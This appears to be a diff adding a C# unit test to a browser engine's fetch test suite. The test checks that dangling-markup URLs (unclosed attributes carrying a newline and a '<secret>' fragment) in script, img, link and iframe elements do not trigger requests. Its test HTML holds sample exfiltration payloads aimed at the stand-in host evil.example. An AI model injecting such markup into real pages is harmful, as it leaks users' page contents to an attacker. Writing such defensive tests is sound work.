@@ -205,6 +205,43 @@ public sealed class FetchTests : IDisposable
     }
 
     [Fact]
+    public void Fetch_DanglingMarkup_ElementsDoNotRequestTheUrl()
+    {
+        _loader.Handler = request => request.Url.StartsWith("https://evil.example/", StringComparison.Ordinal) ? new DocumentResource("") { Headers = [new("Access-Control-Allow-Origin", "*")] } : null;
+
+        // The URL of each element has a newline and a "<" (the markup that follows an attribute whose quote is not closed),
+        // except the URLs of the "allowed" elements, which have a "<" only
+        var document = Load("""
+            <script src="https://evil.example/classic?x=
+            <secret>"></script>
+            <script src="https://evil.example/classic?allowed=<"></script>
+            <script type="module" src="https://evil.example/module?x=
+            <secret>"></script>
+            <script type="module" src="https://evil.example/module?allowed=<"></script>
+            <img src="https://evil.example/img?x=
+            <secret>">
+            <img src="https://evil.example/img?allowed=<">
+            <link rel="stylesheet" href="https://evil.example/link?x=
+            <secret>">
+            <link rel="stylesheet" href="https://evil.example/link?allowed=<">
+            <iframe src="https://evil.example/iframe?x=
+            <secret>"></iframe>
+            <iframe src="https://evil.example/iframe?allowed=<"></iframe>
+            """);
+
+        var requested = _loader.Requests.Select(request => request.Url).Where(url => url.StartsWith("https://evil.example/", StringComparison.Ordinal)).Distinct(StringComparer.Ordinal).Order(StringComparer.Ordinal);
+        Assert.Equal(
+            [
+                "https://evil.example/classic?allowed=%3C",
+                "https://evil.example/iframe?allowed=%3C",
+                "https://evil.example/img?allowed=%3C",
+                "https://evil.example/link?allowed=%3C",
+                "https://evil.example/module?allowed=%3C",
+            ],
+            requested);
+    }
+
+    [Fact]
     public void Fetch_Abort_RejectsWithTheReason()
     {
         _loader.Responses["https://example.com/data"] = new DocumentResource("data");
